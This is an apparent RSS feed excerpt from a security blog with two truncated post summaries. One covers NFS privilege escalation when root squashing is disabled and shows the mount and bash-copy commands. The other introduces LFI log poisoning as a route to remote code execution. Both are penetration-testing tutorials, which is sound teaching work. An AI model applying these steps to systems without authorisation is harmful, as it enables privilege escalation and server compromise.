      <guid>https://s4my9.github.io/posts/no-root-squash-privesc/</guid>
      <description>Introduction In some environments, the root user on a networked file system is treated as an unprivileged user. This is known as &amp;ldquo;root squashing.&amp;rdquo; If root squashing is disabled, an attacker who gains access to an unprivileged account on the file system may be able to escalate their privileges to root.
Demonstration Attacker machine Create a directory named /tmp/mount:
mkdir /tmp/mount Mount the network file system to /tmp/mount:
mount -t nfs &amp;lt;IP&amp;gt;:&amp;lt;SHARED_FOLDER&amp;gt; /tmp/mount Copy the /bin/bash binary from the attacker&amp;rsquo;s system to the mounted file system:</description>

      <description>Introduction LFI (Local File Inclusion) is a common vulnerability found in web applications, allowing an attacker to include local files in the server. LFI Log Poisoning is a technique that leverages LFI vulnerabilities to write arbitrary content to log files on the server. By doing so, an attacker can leverage a LFI to a RCE.
This is the path of a vulnerable LFI :
